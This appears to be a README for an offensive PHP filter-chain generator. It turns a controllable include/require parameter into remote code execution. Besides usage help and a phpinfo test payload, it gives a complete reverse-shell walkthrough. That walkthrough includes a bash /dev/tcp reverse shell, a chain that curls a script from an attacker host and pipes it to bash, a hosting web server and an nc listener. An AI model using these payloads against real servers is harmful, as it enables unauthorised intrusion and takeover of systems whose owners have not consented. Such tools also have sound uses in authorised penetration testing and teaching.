# PHP filter chain generator
A CLI to generate PHP filters chain, get your RCE without uploading a file if you control entirely the parameter passed to a require or an include in PHP!

# Usage
## Usage

### Help

```bash
$ python3 php_filter_chain_generator.py --help
usage: php_filter_chain_generator.py [-h] [--chain CHAIN] [--rawbase64 RAWBASE64]

PHP filter chain generator.

optional arguments:
  -h, --help            show this help message and exit
  --chain CHAIN         Content you want to generate. (you will maybe need to pad with spaces for your payload to work)
  --rawbase64 RAWBASE64
                        The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.

                        The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.

```

### Testing payload
```text

$ python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  '   

```
### Reverse Shell
First create a shell script named "revshell" in local machine.
```text
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```
Then create a chain using a generator.
Replace the ip address with your own.


# `<?= ?>` is a shorthand for `<?php echo ~ ?>`

```text
python3 php_filter_chain_generator.py --chain '<?= `curl -s -L 10.0.0.1/revshell|bash` ?>'

```
We need to start a web server that hosts the shell script, and also start a listener for receiving the reverse connection.


# terminal 1
```text
sudo python3 -m http.server 80
```
# terminal 2
```
nc -lvnp 4444
```
Now access to /?page=<generated_chain>. We can get a shell.
